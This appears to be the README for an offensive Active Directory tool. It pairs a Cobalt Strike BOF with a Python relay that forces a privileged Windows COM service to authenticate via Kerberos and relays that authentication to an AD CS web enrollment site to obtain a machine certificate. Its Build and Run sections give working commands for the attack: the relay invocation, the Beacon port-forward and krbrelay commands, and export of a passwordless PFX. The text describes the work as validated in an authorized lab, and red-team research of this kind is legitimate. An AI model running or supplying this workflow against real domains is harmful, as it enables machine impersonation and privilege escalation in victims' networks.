# KrbRelay BOF to Kerberos-only ESC8

This workspace contains the certificate-only split validated in the authorized
Ludus lab:

1. The x64 BOF registers the same COM/RPC relay used by KrbRelayUp and forces
   the selected privileged COM service to authenticate as the machine named at
   runtime.
2. The BOF exchanges complete DCE/RPC SPNEGO blobs using the documented
   `KRB1` framing.
3. Python relays each leg on one TCP connection to the Kerberos-only IIS site,
   then enrolls the template named at runtime on that authenticated connection.
4. Python verifies that the certificate public key matches its in-memory RSA
   private key and that the certificate has the client-authentication EKU.

The workflow intentionally ends at the usable certificate/key pair. It has no
PKINIT, S4U, ticket import, service creation, or credential-extraction stage.
Raw authentication material is printed only when the corresponding trace or
export option is used.

## Build

The Makefile expects a MinGW package tree at `/tmp/krb-mingw-root`:

```sh
make
make verify
```

The single build artifact is `bof/krbrelay.x64.o`. It is an ordinary COFF BOF;
the build does not produce, embed, or upload PIC, shellcode, a PE, or an EXE.

With a system MinGW install, override `MINGW_PREFIX` and the Makefile compiler
paths as appropriate.

## Run

All deployment-specific values are supplied at runtime; neither the BOF nor
the relay contains a built-in lab address, hostname, endpoint, or port.

Terminal 1 on the Cobalt Strike client. Proxychains is used only for the
relay's outbound ADCS connection; the listener and allowed-peer addresses
default to loopback:

```sh
proxychains4 /home/kali/Tools/Certipy/.venv/bin/python relay/relay_server.py \
  --port RELAY_PORT \
  --adcs-address ADCS_ADDRESS --adcs-host ADCS_HOST --adcs-port ADCS_PORT \
  --domain DOMAIN --machine MACHINE --template TEMPLATE \
  --trace-spnego --export-pfx-b64 --pfx-out MACHINE-machine.pfx
```

Beacon commands:

```text
rportfwd_local RELAY_PORT 127.0.0.1 RELAY_PORT
krbrelay RELAY_PORT http/ADCS_HOST RPC_PORT
```

The reverse forward binds the relay port on target loopback. Cobalt loads the
one COFF object and calls `go`; its worker thread, COM/RPC endpoint, SSPI hook,
bridge socket, and cleanup all remain inside the invoking Beacon process. The
worker unregisters its RPC interface, restores SSPI, waits for in-flight RPC
callbacks, and tears down its COM apartment before Cobalt unloads the BOF. The
BOF creates no process, remote allocation, remote thread, PIC, shellcode,
PE/DLL mapping, or sRDI layer, and uploads no executable.

The Cobalt command exposes only the relay port, service SPN, and target-local
RPC endpoint. The relay address and RPC binding address are fixed to loopback
by the CNA, and the known-good trigger CLSID is internal.

Windows makes COM security immutable after initialization. At entry, the BOF
checks whether the invoking Beacon task thread retained a COM apartment and
balances up to eight retained references before starting its own STA. This
allows the direct BOF to recover when that task thread was the final COM owner,
but it intentionally clears that thread's previous COM state. If another
Beacon thread owns the process COM state, stage 32 remains an explicit failure;
use a fresh Beacon and run this BOF before other COM tooling. No helper process
is created in either case.

The BOF constrains Negotiate to the supplied SPN and relays only Kerberos
SPNEGO records to IIS. It returns as soon as Python confirms that IIS
authenticated the persistent connection; Python then completes enrollment
independently.

The Python functions `run_session()` and `enroll()` also return a
`CertificateBundle` for an in-process follow-on consumer. Without
`--export-pfx-b64`, the standalone command validates the bundle and releases it
on exit.

See `docs/protocol.md` for the bridge format.

`--trace-spnego` prints each complete SPNEGO record and contextual metadata.
`--export-pfx-b64` prints a `PFX_B64=` line containing a passwordless PKCS#12
bundle. Copy the characters following `PFX_B64=` and decode them with:

```sh
printf '%s' 'BASE64_VALUE_HERE' | base64 -d > WIN11-01-machine.pfx
```

`--pfx-out WIN11-01-machine.pfx` writes that same bundle directly with file
mode `0600`.

These options output authentication material and should be omitted when only
non-sensitive validation is desired.

## Design reference

James Forshaw's Project Zero article, [Windows Exploitation Tricks: Relaying
DCOM Authentication](https://projectzero.google/2021/10/windows-exploitation-tricks-relaying.html),
documents the OBJREF/OXID, COM unmarshalling, security-binding, and multi-leg
DCE/RPC authentication behavior on which this design is based.
